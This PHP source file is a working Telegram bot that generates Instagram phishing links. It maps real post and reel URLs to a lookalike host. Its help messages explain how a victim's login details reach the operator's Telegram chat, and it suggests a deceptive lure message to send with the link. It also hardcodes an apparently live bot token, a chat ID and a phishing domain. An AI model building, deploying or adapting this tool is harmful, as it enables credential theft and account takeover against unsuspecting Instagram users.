<?php

// Load environment variables
if (file_exists(__DIR__ . '/.env')) {
    $lines = file(__DIR__ . '/.env', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0) continue;
        if (strpos($line, '=') === false) continue;
        list($key, $value) = explode('=', $line, 2);
        $_ENV[trim($key)] = trim($value);
        putenv(trim($key) . '=' . trim($value));
    }
}

// Hardcoded credentials as fallback
$telegram_bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: "8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA";
$telegram_chat_id = getenv('TELEGRAM_CHAT_ID') ?: "8244999766";
$base_url = getenv('BASE_URL') ?: "https://instagram-www.up.railway.app";

// Get incoming update from Telegram
$content = file_get_contents("php://input");
$update = json_decode($content, true);

if (!$update) {
    echo "No update received";
    exit;
}

// Extract message info
$message = $update['message'] ?? null;
if (!$message) {
    echo "No message";
    exit;
}

$chat_id = $message['chat']['id'];
$text = $message['text'] ?? '';
$user_name = $message['from']['first_name'] ?? 'User';

// Only respond to authorized user
if ($chat_id != $telegram_chat_id) {
    sendMessage($chat_id, "⛔ Unauthorized. This bot only works for authorized users.", $telegram_bot_token);
    exit;
}

// Handle commands
if ($text === '/start') {
    $welcome = "👋 Welcome to Instagram Phishing Link Generator!\n\n";
    $welcome .= "📌 *How to use:*\n";
    $welcome .= "1. Send me a real Instagram video/reel/post URL\n";
    $welcome .= "2. I'll generate a phishing link for you\n";
    $welcome .= "3. Share that link with your target\n";
    $welcome .= "4. They login → You get credentials HERE → They watch the real video!\n\n";
    $welcome .= "📝 *Commands:*\n";
    $welcome .= "/start - Show this message\n";
    $welcome .= "/help - Show help\n\n";
    $welcome .= "🔒 *All credentials are sent ONLY to this chat!*\n\n";
    $welcome .= "🔗 *Send me an Instagram link to get started!*\n";
    $welcome .= "Example: `https://www.instagram.com/reel/ABC123/`";
    
    sendMessage($chat_id, $welcome, $telegram_bot_token);
}
elseif ($text === '/help') {
    $help = "📖 *Help Guide*\n\n";
    $help .= "*To generate a phishing link:*\n";
    $help .= "Send me a real Instagram URL\n\n";
    $help .= "*Example inputs:*\n";
    $help .= "• `https://www.instagram.com/reel/ABC123/`\n";
    $help .= "• `https://www.instagram.com/p/XYZ789/`\n";
    $help .= "• `https://instagram.com/tv/VIDEO123/`\n\n";
    $help .= "*What happens when victim clicks:*\n";
    $help .= "1. Sees Instagram login page\n";
    $help .= "2. Enters credentials\n";
    $help .= "3. You receive their login info HERE! 🎯\n";
    $help .= "4. They get redirected to the REAL video!\n\n";
    $help .= "🔒 *Credentials are sent ONLY to this Telegram chat*\n";
    $help .= "✅ Victim thinks it worked normally!";
    
    sendMessage($chat_id, $help, $telegram_bot_token);
}
else {
    // Check if it's an Instagram URL
    if (isInstagramUrl($text)) {
        $link = generatePhishingLink($base_url, $text);
        
        $response = "✅ *Phishing Link Generated!*\n\n";
        $response .= "🔗 *Your phishing link:*\n`{$link}`\n\n";
        $response .= "🎬 *Original video:*\n`{$text}`\n\n";
        $response .= "📱 *Share the phishing link with your target*\n\n";
        $response .= "✨ *What happens:*\n";
        $response .= "1. Victim clicks your link\n";
        $response .= "2. Sees Instagram login page\n";
        $response .= "3. Enters credentials → You receive them HERE!\n";
        $response .= "4. Victim watches the real video 🎥\n\n";
        $response .= "🔒 *Credentials sent ONLY to this chat*\n\n";
        $response .= "💬 *Suggested message:*\n";
        $response .= "\"_Hey! Is this you in this video?_ 😱\"\n\n";
        $response .= "⚡ Link is ready to use!";
        
        sendMessage($chat_id, $response, $telegram_bot_token);
    } else {
        $response = "⚠️ *Please send a valid Instagram URL!*\n\n";
        $response .= "Supported formats:\n";
        $response .= "• `https://www.instagram.com/reel/ABC123/`\n";
        $response .= "• `https://www.instagram.com/p/XYZ789/`\n";
        $response .= "• `https://instagram.com/tv/VIDEO123/`\n\n";
        $response .= "Send a real Instagram link so victims can watch the actual video after logging in!";
        
        sendMessage($chat_id, $response, $telegram_bot_token);
    }
}

// Functions

function isInstagramUrl($url) {
    $patterns = [
        '/instagram\.com\/(p|reel|tv|reels)\/[a-zA-Z0-9_-]+/i',
        '/instagr\.am\/(p|reel|tv|reels)\/[a-zA-Z0-9_-]+/i'
    ];
    
    foreach ($patterns as $pattern) {
        if (preg_match($pattern, $url)) {
            return true;
        }
    }
    return false;
}

function generatePhishingLink($base_url, $original_url) {
    // Extract the Instagram post/reel ID from the original URL
    preg_match('/\/(p|reel|tv|reels)\/([a-zA-Z0-9_-]+)/i', $original_url, $matches);
    
    $type = $matches[1] ?? 'reel';
    
    // Normalize type
    if ($type === 'reels') $type = 'reel';
    
    // Generate a unique ID
    $short_code = substr(md5($original_url . time() . rand()), 0, 11);
    
    // Store the mapping
    storeUrlMapping($short_code, $original_url);
    
    return "{$base_url}/{$type}/{$short_code}";
}

function storeUrlMapping($code, $original_url) {
    $mappings_file = __DIR__ . '/url_mappings.json';
    
    $mappings = [];
    if (file_exists($mappings_file)) {
        $mappings = json_decode(file_get_contents($mappings_file), true) ?: [];
    }
    
    $mappings[$code] = [
        'original_url' => $original_url,
        'created_at' => date('Y-m-d H:i:s')
    ];
    
    file_put_contents($mappings_file, json_encode($mappings, JSON_PRETTY_PRINT));
}

function sendMessage($chat_id, $text, $token) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    
    $data = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'Markdown',
        'disable_web_page_preview' => true
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

?>
